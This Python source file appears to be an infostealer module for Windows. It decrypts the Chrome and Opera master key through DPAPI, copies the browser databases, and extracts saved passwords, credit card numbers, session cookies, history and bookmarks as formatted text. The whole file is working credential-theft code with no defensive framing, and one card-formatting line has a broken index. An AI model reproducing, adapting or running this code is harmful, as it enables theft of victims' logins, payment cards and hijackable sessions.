# Import modules

import os
import shutil
import random
import ctypes
import subprocess
from ctypes import wintypes
from base64 import b64decode
from datetime import datetime
from string import ascii_lowercase
from sqlite3 import connect as sql_connect
from json import loads as json_loads, load
try:
	from Crypto.Cipher import AES
except ImportError:
	raise SystemExit('Please run › pip install pycryptodome')


# DATA BLOB

class DATA_BLOB(ctypes.Structure):
	_fields_ = [
		('cbData', wintypes.DWORD),
		('pbData', ctypes.POINTER(ctypes.c_char))
	]


# Get data

def GetData(blob_out):
	cbData = int(blob_out.cbData)
	pbData = blob_out.pbData
	buffer = ctypes.c_buffer(cbData)
	ctypes.cdll.msvcrt.memcpy(buffer, pbData, cbData)
	ctypes.windll.kernel32.LocalFree(pbData)
	return buffer.raw


# Decrypt bytes using DPAPI

def CryptUnprotectData(encrypted_bytes, entropy=b''):
	buffer_in = ctypes.c_buffer(encrypted_bytes, len(encrypted_bytes))
	buffer_entropy = ctypes.c_buffer(entropy, len(entropy))
	blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
	blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
	blob_out = DATA_BLOB()

	if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(blob_in), None, ctypes.byref(blob_entropy), None,
		None, 0x01, ctypes.byref(blob_out)):
		return GetData(blob_out)


# Appdata path

LocalAppData = os.environ['LocalAppData'] + '\\'
AppData = os.environ['AppData'] + '\\'
FileName = 116444736000000000
NanoSeconds = 10000000


# Change encoding to UTF8

subprocess.Popen('@chcp 65001 1>nul', shell=True)


# Get browsers install path

def GetBrowsers():
	Browsers = []

	for Browser in BrowsersPath:
		if os.path.exists(Browser):
			Browsers.append(Browser)

	return Browsers


# Decrypt payload

def DecryptPayload(cipher, payload):
	return cipher.decrypt(payload)


# Generate cipher

def GenerateCipher(aes_key, iv):
	return AES.new(aes_key, AES.MODE_GCM, iv)


# Receive master-key

def GetMasterKey(browserPath):
	fail = True

	for i in range(4):
		path = browserPath + '\\..' * i + '\\Local State'

		if os.path.exists(path):
			fail = False
			break

	if fail:
		return None

	with open(path, 'r', encoding='utf-8') as f:
		local_state = f.read()
		local_state = json_loads(local_state)

	master_key = b64decode(local_state['os_crypt']['encrypted_key'])
	master_key = master_key[5:]
	master_key = CryptUnprotectData(master_key)
	return master_key


# Decrypt value

def DecryptValue(buff, master_key=None):
	starts = buff.decode(encoding='utf-8', errors='ignore')[:3]

	if starts == 'v10' or starts == 'v11':
		iv = buff[3:15]
		payload = buff[15:]
		cipher = GenerateCipher(master_key, iv)
		decrypted_pass = DecryptPayload(cipher, payload)
		decrypted_pass = decrypted_pass[:-16].decode()
		return decrypted_pass

	else:
		decrypted_pass = CryptUnprotectData(buff)
		return decrypted_pass


# Get data from database

def FetchDataBase(target_db, sql=''):
	if not os.path.exists(target_db):
		return []

	tmpDB = os.getenv('TEMP') + 'info_' + ''.join(random.choice(ascii_lowercase) for i in range(random.randint(10, 20))) + '.db'
	shutil.copy2(target_db, tmpDB)
	conn = sql_connect(tmpDB)
	cursor = conn.cursor()
	cursor.execute(sql)
	data = cursor.fetchall()
	cursor.close()
	conn.close()

	try:
		os.remove(tmpDB)
	except:
		pass

	return data


# Convert ms time stamp to date

def ConvertDate(ft):
	utc = datetime.utcfromtimestamp(((10 * int(ft)) - FileName) / NanoSeconds)
	return utc.strftime('%Y-%m-%d %H:%M:%S')


# Browsers path's

BrowsersPath = (
	LocalAppData + 'Google\\Chrome\\User Data\\Default',
	AppData + 'Opera Software\\Opera Stable'
)


# Fetch creditcards from chromium based browsers

def GetCreditCards():
	global credentials
	credentials = []

	for browser in GetBrowsers():
		master_key = GetMasterKey(browser)
		database = FetchDataBase(browser + '\\Web Data', 'SELECT * FROM credit_cards')

		for row in database:
			if not row[4]:
				break

			card = {
				'number': DecryptValue(row[4], master_key),
				'expireYear': row[3],
				'expireMonth': row[2],
				'name': row[1],
			}
			credentials.append(card)

	return credentials


# Get passwords converted to NetScape format

def GetFormattedCreditCards():
	getCreditCards = GetCreditCards()
	fmtCreditCards = ''
	for card in getCreditCards:
		fmtCreditCards += ('Number: {4}\nName: {1}\nExpireYear: {3}\nExpireMonth: {2}\n\n'
		.format(card['number'], card['expireYear'], card['expireMonth'], card['name']))

	return fmtCreditCards


# Fetch creditcards from chromium based browsers

def GetBookmarks():
	global credentials
	credentials = []

	for browser in GetBrowsers():
		bookmarksFile = browser + '\\Bookmarks'

		if not os.path.exists(bookmarksFile):
			continue
		else:
			with open(bookmarksFile, 'r', encoding='utf-8', errors='ignore') as file:
				bookmarks = load(file)['roots']['bookmark_bar']['children']

		for row in bookmarks:
			bookmark = {
				'hostname': row['url'],
				'name': row['name'],
				'date_added': ConvertDate(row['date_added'])
			}

			credentials.append(bookmark)

	return credentials


# Get passwords converted to NetScape format

def GetFormattedBookmarks():
	getBookmarks = GetBookmarks()
	fmtBookmarks = ''

	for bookmark in getBookmarks:
		fmtBookmarks += ('URL: {0}\nName: {1}\nDate: {2}\n\n'
		.format(bookmark['hostname'], bookmark['name'], bookmark['date_added']))

	return fmtBookmarks


# Fetch passwords from chromium based browsers

def GetPasswords():
	global credentials
	credentials = []

	for browser in GetBrowsers():
		master_key = GetMasterKey(browser)
		database = FetchDataBase(browser + '\\Login Data', 'SELECT action_url, username_value, password_value FROM logins')

		for row in database:
			password = {
				'hostname': row[0],
				'username': row[1],
				'password': DecryptValue(row[2], master_key)
			}
			credentials.append(password)

	return credentials


# Get passwords converted to NetScape format

def GetFormattedPasswords():
	getPasswords = GetPasswords()
	fmtPasswords = ''

	for password in getPasswords:
		fmtPasswords += ('Hostname: {0}\nUsername: {1}\nPassword: {2}\n\n'
		.format(password['hostname'], password['username'], password['password']))

	return fmtPasswords


# Fetch cookies from chromium based browsers

def GetCookies():
	global credentials
	credentials = []

	for browser in GetBrowsers():
		master_key = GetMasterKey(browser)
		database = FetchDataBase(browser + '\\Cookies', 'SELECT * FROM cookies')

		for row in database:
			cookie = {
				'value': DecryptValue(row[12], master_key),
				'hostname': row[1],
				'name': row[2],
				'path': row[4],
				'expires': row[5],
				'secure': bool(row[6])
			}
			credentials.append(cookie)

	return credentials


# Get cookies converted to NetScape format

def GetFormattedCookies():
	getCookies = GetCookies()
	fmtCookies = ''

	for cookie in getCookies:
		fmtCookies += ('Value: {0}\nHost: {1}\nName: {2}\nPath: {3}\nExpire: {4}\nSecure: {5}\n\n'
		.format(cookie['value'], cookie['hostname'], cookie['name'], cookie['path'],  cookie['expires'], cookie['secure']))

	return fmtCookies


# Fetch history from chromium based browsers

def GetHistory():
	global credentials
	credentials = []

	for browser in GetBrowsers():
		database = FetchDataBase(browser + '\\History', 'SELECT * FROM urls')

		for row in database:
			history = {
				'hostname': row[1],
				'title': row[2],
				'visits': row[3] + 1,
				'expires': ConvertDate(row[5])
			}
			credentials.append(history)

	return credentials


# Get history converted to NetScape format

def GetFormattedHistory():
	getHistory = GetHistory()
	fmtHistory = ''

	for history in getHistory:
		fmtHistory += ('Hostname: {0}\nTitle: {1}\nVisits: {2}\nExpires: {3}\n\n'
		.format(history['hostname'], history['title'], history['visits'], history['expires']))

	return fmtHistory

